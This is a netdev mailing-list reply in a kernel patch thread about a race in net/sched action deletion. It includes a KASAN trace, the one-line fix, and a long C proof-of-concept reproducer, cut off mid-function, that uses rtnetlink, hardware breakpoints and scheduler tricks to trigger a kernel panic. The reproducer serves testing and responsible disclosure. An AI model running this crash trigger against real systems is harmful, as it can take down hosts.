Received: from mail-ej2-f12.google.com (mail-ej2-f12.google.com [74.125.228.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4B799469855
	for <netdev@vger.kernel.org>; Mon, 14 Sep 2026 12:33:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.228.140
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789389203; cv=pass; b=moM5kRbOjRzac9QgGhgxO+CTLc9xu+NiNfuWL414greYBEco/arb7IxS4yPglBQd3jlNxzRWwOcjkjUyVK8Gdj5JKuDwZ/NW70YfAfG0c076UvS++/O7K2WxWrHrS5REdl+qq6Slai0ZAbvfItd78/gnVkSdlxdHGZu4L7u/+Vs=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789389203; c=relaxed/simple;
	bh=iU0C7woK9SGWAQdyQBmKIkFWc3UB/FS48luQPKGzv6Q=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=OYoqoKtcP4VrXFBSPPc8OeMx949V2Gv8TSD2S+phhQtOUHEjtMYrMBnjpi8hbcYiT5y03rPnc5t/Cv7pvY2zUwIXIAs/4EDOWyrC5+1L8oCDGwchjINOMRDoYPrW3+bZ/vC+3ifsKCLwyKj/lFLYEb2YsiqeDaRKKXi0riyYU4A=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=q2TfhcDe; arc=pass smtp.client-ip=74.125.228.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="q2TfhcDe"
Received: by mail-ej2-f12.google.com with SMTP id a640c23a62f3a-c254f55efebso300781366b.1
        for <netdev@vger.kernel.org>; Mon, 14 Sep 2026 05:33:20 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1789389198; cv=none;
        d=google.com; s=arc-20260327;
        b=gL+w5UbvxliubSz6Kd2JFQhBTj+QMfxI2yp1KfydQH3kWdGX6m86BMw7guzRSvCm9h
         A8bGc82aRaIN1a0/p3r/+VFSOU9DaajvZ/XG6vYOhPNaRd6jimjo45FNYzf4Ns//VDrt
         otuS5NsS4M8OOK++ZDZqreQVUXTNOQXCBqwcp0NSbs/lM29xX13IcmLtCz5PE3GEK8lH
         Zc6qFJojIcZmqe5qXOIcKcsW3PmsKFoSeNLwl6DpG/UN0Ut+LXoW5dwiFE3WYz21+NLk
         lLVH8nSuKQcPvPMBRXR0uRksY0BcyauTKI0r6Gd7YHVjUDwdWLKEUDTcYO9u6o+MjoT8
         HNrQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=44xPqSFRs8KSHazBmYkIFhsOrZcJfnN2/Jc+gpj027E=;
        fh=Oo87NCOZVZkvrjdP7EbXX+sBMC+wM56nYJO5CFl+UTA=;
        b=pGY1K+elNu/Nt1L2Ce9lQ9ak47rh9+1l4/0wXeNpf4W8soxC8zA2f8ToR+YK0IuzXs
         pWFNh899lnf+DLypAxlaNlzdO7yU1/O3l4/5PVdx0cDvFnX6CZMzTnPj42sPZSjLBcxD
         nvQFeD5AgJziWxnmzfHwvsnJnRJvYSwYEQ6NDl+dqd1uiV+L27ZmFIEG5r+hAzehb93T
         Gz63aUZrIYYfhKDDJxpy7OA5e8ER+U6kAthiVaibmkwv0XYosZ1qPSBFJTUX4I3IXo5/
         OmqF91Fo5IcC2v67WqwtgvLFtpSMB+IGerkJhSdBFKNt8/DZ0R4QBkEWTLGDNI9WwRKv
         XNoQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789389198; x=1789993998; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=44xPqSFRs8KSHazBmYkIFhsOrZcJfnN2/Jc+gpj027E=;
        b=q2TfhcDeh0BTfK+nJzZzcjz5bcL+l9GyTjFzNHAbH+aex6C/9OmZ5YXZrC4+C57UlW
         Eb7MN3jpaXDyr/hhHtkx32AqmJYvp2QA7J9Est7FvBXiSyNDm/Cy1H3t3pEFCbs1S9Se
         dCh6qkOYawEl645RjBmuef+qT3eE9sEmmfgS2FbO3Rh1jfwov5EX6qD8tyFTqvSSrn0Y
         ggOBkfjJkRcNfgdKqbB5dlpjzA/2+6YLGmfsXwx6I2EaplGcTCg5X3Ok8B5hOJWejpa4
         OgLQ0c//TEnr+LeN5T1/3Z4fQqxAk/O0NCMkoNrqLlJGKBkHjBnYs1isbZbGTidSdoCu
         J/CA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789389198; x=1789993998;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=44xPqSFRs8KSHazBmYkIFhsOrZcJfnN2/Jc+gpj027E=;
        b=NQdbQNfIQcfM6dfoaMJkfutyQRTEtSPK7AfZy3FJPd/m1Uy+bpATfjaLFzHEgOPnqe
         9053rR+qn0rVN1VpD2x2ojs90beq3f9Nms3Ch0gX50cF5KD4kwsEtsT03Hz+YBLXpWwZ
         Ww1qWm679sxB/5kMCqRYAdlIYDxiurd815plEGGVgsglRGMmL2pEzV9u+442NNE26ij3
         vNIZNUf43j3Bp2FpdooeA0VusVIw2odoXhyxm/8MqFOqBal36zSuIPMKCnbPwEEoXVXf
         TYbDu8XG8IH490w8vgRAihuVaGaQGIG9I/7Cxcd5wvr6tkvMJreye4aCx1zSfJJA8fY0
         QBlQ==
X-Forwarded-Encrypted: i=1; AKwUvBy7hqfQ7UyIiPkGnkyDXWKjOw7srIgmPmYxZwn8WZ4Q8SUuzMwfyEiphFaHvo5v0ptKhCQUSis=@vger.kernel.org
X-Gm-Message-State: AFuF++k5hw5Y/tnhVHGWkV73BmzHvdmWzmuFxaCyLYBIeSxZr0Mur+vC
	A+xfYwNh4OI9udtTbJpXmR78cPACevFfm6mechF8MsTUAOITgoWc2I1a47UNrGl9Ys4+sGHcuv+
	oPsIdd5hG1Zv5ymrFAUXwV1/FfBHuMq0=
X-Gm-Gg: AYBFou0r5L2jbOgaritXmDMzDK2aB33V8p1D7VP4H0VfIFAqaZsPY19YHssp45wpEbO
	yCRXsuTcxHigoUbKxqqRu8IxPTZGGqnYwENMtj8qsB0q5NzzdBikMf5qc+OkIbxvNaSlw5B2pjx
	/OmeGmNyIgVhDVY6yaguHKxYl/xQIX6bRXiiSEjL6P59uTduyhTeuKQFTqgjA4dR9EBHHCTjcuN
	LqYyKQqJ9rxNNlJfErJat900bWlANok3s6QvymWiPInr+V5OIta40EXaXGU8Pt9fPdHrhCNU4Jg
	5CZf21F0CJ44OpepiCGS3NpDdHY7cIcPtIXuhFW7g9miNvDZ5b734e0DJSVwAPcxP9l10MppUqA
	f+7oi/7I=
X-Received: by 2002:a17:907:3e1b:b0:c26:1691:b369 with SMTP id
 a640c23a62f3a-c29b870afcemr162977866b.34.1789389197771; Mon, 14 Sep 2026
 05:33:17 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260914065123.4109709-2-bestswngs@gmail.com> <CAM0EoM=7jH_OqmbERPVNrFg7Q079g2f1oWOKiO4nRLA3Zxcm3A@mail.gmail.com>
In-Reply-To: <CAM0EoM=7jH_OqmbERPVNrFg7Q079g2f1oWOKiO4nRLA3Zxcm3A@mail.gmail.com>
From: Weiming Shi <bestswngs@gmail.com>
Date: Mon, 14 Sep 2026 20:32:40 +0800
X-Gm-Features: AcwNN1WDudpSeMR45wpqXKCBzshxtAJj_gJ3GDv9UD8xV2b8j2IFSqfAGQ_VEpI
Message-ID: <CANgPUi1f2z3UKU6Q5djAJ51vwKqO+F5np7bwWys3rz=29NABPQ@mail.gmail.com>
Subject: Re: [PATCH net] net/sched: reject IDR error pointers when deleting actions
To: Jamal Hadi Salim <jhs@mojatatu.com>
Cc: Jiri Pirko <jiri@resnulli.us>, "David S . Miller" <davem@davemloft.net>, 
	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
	Simon Horman <horms@kernel.org>, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
	Vlad Buslov <vladbu@mellanox.com>, Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>, 
	Xiang Mei <xmei5@asu.edu>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Jamal Hadi Salim <jhs@mojatatu.com> =E4=BA=8E2026=E5=B9=B49=E6=9C=8814=E6=
=97=A5=E5=91=A8=E4=B8=80 17:58=E5=86=99=E9=81=93=EF=BC=9A
>
> On Mon, Sep 14, 2026 at 2:51=E2=80=AFAM Weiming Shi <bestswngs@gmail.com>=
 wrote:
> >
> > tcf_action_delete() drops the reference held by its lookup before calli=
ng
> > tcf_idr_delete_index() with the saved action index.  An unlocked
> > classifier can remove that action and reserve the same IDR slot with
> > ERR_PTR(-EBUSY) in between.
> >
> > tcf_idr_delete_index() only checks the lookup result for NULL.  It
> > therefore treats the reservation as a tc_action and dereferences
> > tcfa_bindcnt.  A hardware execution breakpoint was used to schedule the
> > interleaving without changing the kernel source.  KASAN reported this
> > decoded trace:
> >
> >   BUG: KASAN: null-ptr-deref in tca_action_gd+0x5b9/0x1010
> >   Read of size 4 at addr 0000000000000010 by task poc/150
> >   Oops: general protection fault, probably for non-canonical address 0x=
dffffc0000000002
> >   RIP: tca_action_gd+0x5c0/0x1010:
> >     arch_atomic_read at arch/x86/include/asm/atomic.h:23
> >     raw_atomic_read at include/linux/atomic/atomic-arch-fallback.h:457
> >     atomic_read at include/linux/atomic/atomic-instrumented.h:33
> >     tcf_idr_delete_index at net/sched/act_api.c:766
> >     tcf_action_delete at net/sched/act_api.c:1859
> >     tcf_del_notify at net/sched/act_api.c:2014
> >     tca_action_gd at net/sched/act_api.c:2064
> >   R13: 0000000000000010 R15: fffffffffffffff0
> >   Kernel panic - not syncing: Fatal exception
> >
> > R15 contains ERR_PTR(-EBUSY), and adding the tcfa_bindcnt offset produc=
es
> > the address in R13.  With the guard applied, the same reproducer return=
ed
> > -ENOENT without a KASAN report or panic.  Treat error pointers as absen=
t
> > and return -ENOENT.
> >
>
> We test all submissions to tc. Can you provide a tdc test or reproducer (=
PoC)?
> Please remember tto do his for any future submissions. If the
> information is sensitive, please send it to me privately.
>
> cheer,
> jamal
>
>
> > Fixes: 0190c1d452a9 ("net: sched: atomically check-allocate action")
> > Cc: stable@vger.kernel.org
> > Reported-by: Xiang Mei <xmei5@asu.edu>
> > Assisted-by: LLM
> > Signed-off-by: Weiming Shi <bestswngs@gmail.com>
> > ---
> >  net/sched/act_api.c | 2 +-
> >  1 file changed, 1 insertion(+), 1 deletion(-)
> >
> > diff --git a/net/sched/act_api.c b/net/sched/act_api.c
> > index 19501dc99..eabe612b7 100644
> > --- a/net/sched/act_api.c
> > +++ b/net/sched/act_api.c
> > @@ -758,7 +758,7 @@ static int tcf_idr_delete_index(struct tcf_idrinfo =
*idrinfo, u32 index)
> >
> >         mutex_lock(&idrinfo->lock);
> >         p =3D idr_find(&idrinfo->action_idr, index);
> > -       if (!p) {
> > +       if (IS_ERR_OR_NULL(p)) {
> >                 mutex_unlock(&idrinfo->lock);
> >                 return -ENOENT;
> >         }
> >
> > base-commit: e6b6078ea1731b05b3b552497b3bce4bf8b014ae
> > --
> > 2.55.0
> >

Hi Jamal,

Thanks for the reminder. I have attached the standalone reproducer as poc.c=
.
It uses raw rtnetlink. ill also make sure to include selftests or a
PoC in future submissions.

I tested it in a 4-vCPU x86-64 QEMU/KVM guest with the following relevant
options enabled:

```
    CONFIG_SMP=3Dy
    CONFIG_NET_NS=3Dy
    CONFIG_NET_SCH_INGRESS=3Dy
    CONFIG_NET_CLS_ACT=3Dy
    CONFIG_NET_CLS_FLOWER=3Dy
    CONFIG_NET_ACT_GACT=3Dy
    CONFIG_PERF_EVENTS=3Dy
    CONFIG_HAVE_HW_BREAKPOINT=3Dy
    CONFIG_MEMBARRIER=3Dy
    CONFIG_KASAN=3Dy
    CONFIG_DEBUG_INFO=3Dy
```

PoC:

This is a narrow race. With the configuration above, five independent vulne=
rable
kernel boots produced one KASAN panic, three -ENOENT results and one
-EPERM result. A missed run exits normally and can simply be repeated.

build
```
gcc -static -O2 -Wall -Wextra -Werror -pthread -o poc poc-no-printf.c
```
source
```c
#define _GNU_SOURCE
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/netlink.h>
#include <linux/membarrier.h>
#include <linux/hw_breakpoint.h>
#include <linux/perf_event.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <stdatomic.h>
#include <sys/wait.h>
#include <semaphore.h>

#define TC_H_INGRESS             0xFFFFFFF1U
#define TC_H_CLSACT              TC_H_INGRESS
#define CLSACT_HANDLE            0xFFFF0000U
#define CLSACT_INGRESS_PARENT    0xFFFFFFF2U
#define TCA_KIND_A               1
#define TCA_OPTIONS_A            2
#define TCA_FLOWER_ACT           3
#define TCA_FLOWER_KEY_IP_PROTO  9
#define TCA_ACT_KIND             1
#define TCA_ACT_OPTIONS          2
#define TCA_ACT_INDEX            3
#define TCA_GACT_PARMS           2
#define TC_ACT_SHOT              2
#define TCA_ROOT_TAB             1
struct tc_gact_local {
__u32 index;
__u32 capab;
int action;
int refcnt;
int bindcnt;
};

struct req {
struct nlmsghdr n;
char buf[65536];
};

static int ifindex;
static __thread long last_send_ns;
static __thread long last_send_start_ns;

static void __attribute__((noinline))
nl_put(struct nlmsghdr *n, int type, const void *data, int len)
{
struct nlattr *a;

a =3D (struct nlattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
a->nla_type =3D type;
a->nla_len =3D NLA_HDRLEN + len;
if (len)
memcpy((char *)a + NLA_HDRLEN, data, len);
n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(a->nla_len);
}

static struct nlattr *nl_nest(struct nlmsghdr *n, int type)
{
struct nlattr *a;

a =3D (struct nlattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
a->nla_type =3D type | NLA_F_NESTED;
a->nla_len =3D NLA_HDRLEN;
n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLA_HDRLEN;
return a;
}

static void nl_nest_end(struct nlmsghdr *n, struct nlattr *a)
{
a->nla_len =3D (char *)n + n->nlmsg_len - (char *)a;
}

static int nl_open(void)
{
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
int sndbuf =3D 1024 * 1024;

if (fd < 0)
return -1;
(void)setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
close(fd);
return -1;
}
return fd;
}

static int nl_talk(int fd, struct nlmsghdr *n, const char *what)
{
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
char buf[8192];
struct nlmsghdr *r;
int len;

(void)what;

n->nlmsg_seq =3D (unsigned)time(NULL) ^
      (unsigned)(unsigned long)pthread_self() ^ rand();
n->nlmsg_pid =3D 0;
{
struct timespec before, after;

clock_gettime(CLOCK_MONOTONIC, &before);
last_send_start_ns =3D before.tv_sec * 1000000000L + before.tv_nsec;
if (sendto(fd, n, n->nlmsg_len, 0,
  (struct sockaddr *)&sa, sizeof(sa)) < 0)
return -1;
clock_gettime(CLOCK_MONOTONIC, &after);
last_send_ns =3D (after.tv_sec - before.tv_sec) * 1000000000L +
      after.tv_nsec - before.tv_nsec;
}
len =3D recv(fd, buf, sizeof(buf), 0);
if (len < 0)
return -1;
for (r =3D (struct nlmsghdr *)buf; NLMSG_OK(r, (unsigned)len);
    r =3D NLMSG_NEXT(r, len)) {
if (r->nlmsg_type =3D=3D NLMSG_ERROR) {
struct nlmsgerr *e =3D (struct nlmsgerr *)NLMSG_DATA(r);

return e->error;
}
}
return 0;
}

static void init_tc(struct req *q, int type, int flags, int idx,
   unsigned handle, unsigned parent, unsigned info)
{
struct tcmsg *t;

memset(q, 0, sizeof(*q));
q->n.nlmsg_len =3D NLMSG_LENGTH(sizeof(*t));
q->n.nlmsg_type =3D type;
q->n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | flags;
t =3D (struct tcmsg *)NLMSG_DATA(&q->n);
t->tcm_family =3D AF_UNSPEC;
t->tcm_ifindex =3D idx;
t->tcm_handle =3D handle;
t->tcm_parent =3D parent;
t->tcm_info =3D info;
}

static unsigned filter_info(int prio)
{
return ((unsigned)prio << 16) | 0x0008U;
}

static int link_up(int fd)
{
struct {
struct nlmsghdr n;
char buf[256];
} q =3D {};
struct ifinfomsg *ifi;

q.n.nlmsg_len =3D NLMSG_LENGTH(sizeof(*ifi));
q.n.nlmsg_type =3D RTM_NEWLINK;
q.n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
ifi =3D (struct ifinfomsg *)NLMSG_DATA(&q.n);
ifi->ifi_family =3D AF_UNSPEC;
ifi->ifi_index =3D ifindex;
ifi->ifi_flags =3D IFF_UP;
ifi->ifi_change =3D IFF_UP;
return nl_talk(fd, &q.n, "lo up");
}

static int add_clsact(int fd)
{
struct req q;

init_tc(&q, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL, ifindex,
CLSACT_HANDLE, TC_H_CLSACT, 0);
nl_put(&q.n, TCA_KIND_A, "clsact", 7);
return nl_talk(fd, &q.n, "add clsact");
}

static int __attribute__((unused))
add_filter(int fd, int prio, unsigned handle, __u32 act_index)
{
struct tc_gact_local g =3D { .index =3D act_index,
  .action =3D TC_ACT_SHOT };
struct nlattr *opts, *acts, *a1, *aopts;
struct req q;

init_tc(&q, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, ifindex,
handle, CLSACT_INGRESS_PARENT, filter_info(prio));
nl_put(&q.n, TCA_KIND_A, "flower", 7);
opts =3D nl_nest(&q.n, TCA_OPTIONS_A);
acts =3D nl_nest(&q.n, TCA_FLOWER_ACT);
a1 =3D nl_nest(&q.n, 1);
nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_GACT_PARMS, &g, sizeof(g));
nl_nest_end(&q.n, aopts);
nl_nest_end(&q.n, a1);
nl_nest_end(&q.n, acts);
nl_nest_end(&q.n, opts);
return nl_talk(fd, &q.n, "add flower filter");
}

/* Keep a flower tcf_proto alive at @prio.  The IP protocol key makes this
 * anchor distinct from the match-all filter used by the race itself.
 */
static int __attribute__((unused)) add_anchor_filter(int fd, int prio,
unsigned handle,
    __u32 act_index)
{
struct tc_gact_local g =3D { .index =3D act_index,
  .action =3D TC_ACT_SHOT };
struct nlattr *opts, *acts, *a1, *aopts;
unsigned char ip_proto =3D 6;
struct req q;

init_tc(&q, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, ifindex,
handle, CLSACT_INGRESS_PARENT, filter_info(prio));
nl_put(&q.n, TCA_KIND_A, "flower", 7);
opts =3D nl_nest(&q.n, TCA_OPTIONS_A);
nl_put(&q.n, TCA_FLOWER_KEY_IP_PROTO, &ip_proto, sizeof(ip_proto));
acts =3D nl_nest(&q.n, TCA_FLOWER_ACT);
a1 =3D nl_nest(&q.n, 1);
nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_GACT_PARMS, &g, sizeof(g));
nl_nest_end(&q.n, aopts);
nl_nest_end(&q.n, a1);
nl_nest_end(&q.n, acts);
nl_nest_end(&q.n, opts);
return nl_talk(fd, &q.n, "add flower anchor");
}

static int del_filter(int fd, int prio, unsigned handle)
{
struct req q;

init_tc(&q, RTM_DELTFILTER, 0, ifindex, handle,
CLSACT_INGRESS_PARENT, filter_info(prio));
nl_put(&q.n, TCA_KIND_A, "flower", 7);
return nl_talk(fd, &q.n, "del flower filter");
}

static int del_actions(int fd, const __u32 *indices, size_t count,
      const char *what)
{
struct {
struct nlmsghdr n;
char buf[1024];
} q =3D {};
struct nlattr *tab;
struct tcamsg *t;
size_t i;

q.n.nlmsg_len =3D NLMSG_LENGTH(sizeof(*t));
q.n.nlmsg_type =3D RTM_DELACTION;
q.n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
t =3D (struct tcamsg *)NLMSG_DATA(&q.n);
t->tca_family =3D AF_UNSPEC;
tab =3D nl_nest(&q.n, TCA_ROOT_TAB);
for (i =3D 0; i < count; i++) {
struct nlattr *action =3D nl_nest(&q.n, i + 1);

nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
nl_put(&q.n, TCA_ACT_INDEX, &indices[i], sizeof(indices[i]));
nl_nest_end(&q.n, action);
}
nl_nest_end(&q.n, tab);
return nl_talk(fd, &q.n, what);
}

static int __attribute__((unused)) del_action(int fd, __u32 index)
{
return del_actions(fd, &index, 1, "del action");
}

static int __attribute__((unused))
add_standalone_actions(int fd, const __u32 *indices, size_t count)
{
struct {
struct nlmsghdr n;
char buf[4096];
} q =3D {};
struct nlattr *tab;
struct tcamsg *t;
size_t i;

q.n.nlmsg_len =3D NLMSG_LENGTH(sizeof(*t));
q.n.nlmsg_type =3D RTM_NEWACTION;
q.n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK |
      NLM_F_CREATE | NLM_F_EXCL;
t =3D (struct tcamsg *)NLMSG_DATA(&q.n);
t->tca_family =3D AF_UNSPEC;
tab =3D nl_nest(&q.n, TCA_ROOT_TAB);
for (i =3D 0; i < count; i++) {
struct tc_gact_local g =3D {
.index =3D indices[i],
.action =3D TC_ACT_SHOT,
};
struct nlattr *action =3D nl_nest(&q.n, i + 1);
struct nlattr *aopts;

nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_GACT_PARMS, &g, sizeof(g));
nl_nest_end(&q.n, aopts);
nl_nest_end(&q.n, action);
}
nl_nest_end(&q.n, tab);
return nl_talk(fd, &q.n, "add standalone dummy actions");
}

static void __attribute__((unused)) sleep_us(long usec)
{
struct timespec ts =3D { usec / 1000000, (usec % 1000000) * 1000 };

nanosleep(&ts, NULL);
}



#define ACTION_COUNT 32
#define TARGET_START 0x100000U
#ifndef RACE_TRIALS
#define RACE_TRIALS 20
#endif
#define RCU_BUSY_US 3000L
#define GUARD_YIELDS 2000
#ifndef HEADSTART_MIN_US
#define HEADSTART_MIN_US 220L
#endif
#ifndef HEADSTART_SLOTS
#define HEADSTART_SLOTS 1L
#endif
#ifndef BREAKPOINT_ADDR
/* Pass the build-specific address as argv[1]; this override is for
automation. */
#define BREAKPOINT_ADDR 0ULL
#endif

static unsigned long breakpoint_addr =3D BREAKPOINT_ADDR;

struct race_ctx {
sem_t racer_start;
sem_t controller_start;
sem_t controller_armed;
sem_t creator_start;
sem_t guard_start[2];
sem_t guard_done;
sem_t sync_start;
sem_t sync_done;
sem_t done;
long wake_ns;
long headstart_us;
__u64 period;
int perf_fd;
int perf_signal_seen;
int old_prio;
int new_prio;
int detector_prio;
__u32 target;
int racer_ret;
int delete_ret;
int creator_ret;
int detector_ret;
int sync_ret;
long detector_send_ns;
long actual_wake_ns;
long racer_send_ns;
long creator_send_ns;
long creator_send_start_abs_ns;
long creator_start_abs_ns;
long controller_release_abs_ns;
atomic_int stop;
atomic_int guard_count;
atomic_int guard_release;
atomic_int racer_tid;
atomic_int controller_tid;
};

struct guard_ctx {
struct race_ctx *race;
int id;
};

static void fill_indices(__u32 indices[ACTION_COUNT], __u32 target)
{
int i;

indices[0] =3D target;
for (i =3D 1; i < ACTION_COUNT; i++)
indices[i] =3D target + 63 + i;
}

static void __attribute__((unused))
fill_delete_indices(__u32 indices[ACTION_COUNT], __u32 target)
{
int i;

for (i =3D 0; i < ACTION_COUNT - 1; i++)
indices[i] =3D target + i + 1;
indices[ACTION_COUNT - 1] =3D target;
}

static int __attribute__((unused)) add_filter_many(int fd, int prio,
unsigned handle,
  const __u32 indices[ACTION_COUNT])
{
struct req q;
struct nlattr *opts, *acts;
int i;

memset(&q, 0, sizeof(q));
init_tc(&q, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, ifindex,
handle, CLSACT_INGRESS_PARENT, filter_info(prio));
nl_put(&q.n, TCA_KIND_A, "flower", 7);
opts =3D nl_nest(&q.n, TCA_OPTIONS_A);
acts =3D nl_nest(&q.n, TCA_FLOWER_ACT);
for (i =3D 0; i < ACTION_COUNT; i++) {
struct tc_gact_local g =3D {
.index =3D indices[i],
.action =3D i =3D=3D ACTION_COUNT - 1 ? TC_ACT_SHOT : 3,
};
struct nlattr *action, *aopts;

action =3D nl_nest(&q.n, i + 1);
nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_GACT_PARMS, &g, sizeof(g));
nl_nest_end(&q.n, aopts);
nl_nest_end(&q.n, action);
}
nl_nest_end(&q.n, acts);
nl_nest_end(&q.n, opts);
return nl_talk(fd, &q.n, "add 32-action flower filter");
}


#define TCA_PEDIT_PARMS_LOCAL 2
#define PEDIT_KEYS 255

struct tc_pedit_key_local {
__u32 mask;
__u32 val;
__u32 off;
__u32 at;
__u32 offmask;
__u32 shift;
};

struct tc_pedit_sel_local {
__u32 index;
__u32 capab;
int action;
int refcnt;
int bindcnt;
unsigned char nkeys;
unsigned char flags;
unsigned char pad[2];
};

static int __attribute__((unused))
add_filter_slow(int fd, int prio, unsigned handle, __u32 target)
{
struct req q;
struct nlattr *opts, *acts;
int i;

memset(&q, 0, sizeof(q));
init_tc(&q, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, ifindex,
handle, CLSACT_INGRESS_PARENT, filter_info(prio));
nl_put(&q.n, TCA_KIND_A, "flower", 7);
opts =3D nl_nest(&q.n, TCA_OPTIONS_A);
acts =3D nl_nest(&q.n, TCA_FLOWER_ACT);
for (i =3D 0; i < ACTION_COUNT; i++) {
struct nlattr *action, *aopts;

action =3D nl_nest(&q.n, i + 1);
if (!i) {
struct tc_gact_local g =3D {
.index =3D target,
.action =3D 3,
};

nl_put(&q.n, TCA_ACT_KIND, "gact", 5);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_GACT_PARMS, &g, sizeof(g));
} else {
unsigned char payload[sizeof(struct tc_pedit_sel_local) +
     PEDIT_KEYS * sizeof(struct tc_pedit_key_local)] =3D {};
struct tc_pedit_sel_local *sel =3D (void *)payload;

sel->index =3D target + i;
sel->action =3D i =3D=3D ACTION_COUNT - 1 ? TC_ACT_SHOT : 3;
sel->nkeys =3D PEDIT_KEYS;
nl_put(&q.n, TCA_ACT_KIND, "pedit", 6);
aopts =3D nl_nest(&q.n, TCA_ACT_OPTIONS);
nl_put(&q.n, TCA_PEDIT_PARMS_LOCAL, payload,
      sizeof(payload));
}
nl_nest_end(&q.n, aopts);
nl_nest_end(&q.n, action);
}
nl_nest_end(&q.n, acts);
nl_nest_end(&q.n, opts);
return nl_talk(fd, &q.n, "add slow 32-action flower filter");
}

static void pin_cpu(int cpu)
{
cpu_set_t set;

CPU_ZERO(&set);
CPU_SET(cpu, &set);
(void)sched_setaffinity(0, sizeof(set), &set);
}

static void set_fifo(int priority)
{
struct sched_param param =3D { .sched_priority =3D priority };

(void)sched_setscheduler(0, SCHED_FIFO, &param);
}

static void __attribute__((unused)) sleep_ns(long ns)
{
struct timespec ts =3D { .tv_sec =3D ns / 1000000000L,
      .tv_nsec =3D ns % 1000000000L };

while (nanosleep(&ts, &ts) && errno =3D=3D EINTR)
;
}

static void busy_us(long us)
{
struct timespec now, end;

clock_gettime(CLOCK_MONOTONIC, &now);
end =3D now;
end.tv_nsec +=3D us * 1000L;
end.tv_sec +=3D end.tv_nsec / 1000000000L;
end.tv_nsec %=3D 1000000000L;
do {
clock_gettime(CLOCK_MONOTONIC, &now);
} while (now.tv_sec < end.tv_sec ||
(now.tv_sec =3D=3D end.tv_sec && now.tv_nsec < end.tv_nsec));
}

static long mono_ns(void)
{
struct timespec ts;

